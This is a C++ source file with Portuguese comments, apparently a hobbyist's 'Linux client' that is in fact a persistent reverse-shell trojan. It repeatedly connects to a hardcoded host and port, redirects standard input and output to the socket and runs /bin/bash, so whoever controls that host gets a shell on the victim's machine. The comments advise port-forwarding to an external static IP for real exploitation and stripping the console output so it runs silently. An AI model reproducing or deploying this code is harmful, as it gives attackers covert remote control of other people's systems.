// //////////
// LINUX CLIENT
// Autor: Raique
// NickName: Rablidad
// Versão: tem bastante coisa ainda para adicionar (Ainda não versão final)
// //////////


#include <iostream>
#include <cstdlib>
#include <cstring>
#include <string>
#include <unistd.h>
#include <fstream>
#include <sys/types.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <netdb.h>
#include <stdexcept>
#include <vector>
#include <stdio.h>
#include <stdlib.h>

using std::cout;
using std::string;
using std::cin;
using std::endl;
using std::vector;
using std::exception;

uint16_t port = 5555;
const char * host = "192.168.1.31"; // para extern connections tu pode fazer um redirecionamento de porta de ip, e colocar o seu ip externo, recomendavel que seja IP estatico e não dinamico, uma vez que dinamico dificultaria todo o processo de exploração

// função que de fato vai a todo momento tentar reestabelecer a conexão, quando o server fechar, ou dar erro, ou seja
// o cliente, nunca vai se desligar, independente do que aconteça.

int main(){
	int conectar;
	
	sockaddr_in taddr;
	taddr.sin_port = htons(port);
	taddr.sin_family = AF_INET;
	taddr.sin_addr.s_addr = inet_addr(host);
	std::memset(&taddr.sin_zero,'\0', sizeof(taddr.sin_zero));

	pid_t child_trojan = fork();

	socklen_t sin_size = sizeof(taddr);

	int sockfd = socket(PF_INET, SOCK_STREAM, 0);
	
	
	// loop para sempre reestabelecer a conexão quando o server for fechado e/ou cancelada!
		if(child_trojan == 0){


			
			while(true){
				try{

					// sys_write call apenas para testes caseiros, numa exploração real, recomendado apagar todas as sys_write calls, para uma execução em mood silencioso e prompt de commando.
					cout << "[+] Tentando Estabelecer Conexão." << endl;
					if((conectar = connect(sockfd, (struct sockaddr *)&taddr, sin_size)) == -1){
						cout << "[-] Conexão não realizada" << endl;
						throw 99;
					}
					else{
						break;
					}
				}catch(int x){
					cout << endl << "-----" << endl  << "[-] Erro: " << x << endl << "[*] Tentando Novamente em 10 segundos." << endl << "-----" << endl;
					sleep(10);

				}
			}
			dup2(sockfd, 0);
			dup2(sockfd, 1);
			dup2(sockfd, 2);
			char * const args[] = {"/bin/bash", NULL};
			execvp(args[0], args);

		}else{
			wait(NULL);
			main();	
		}

}
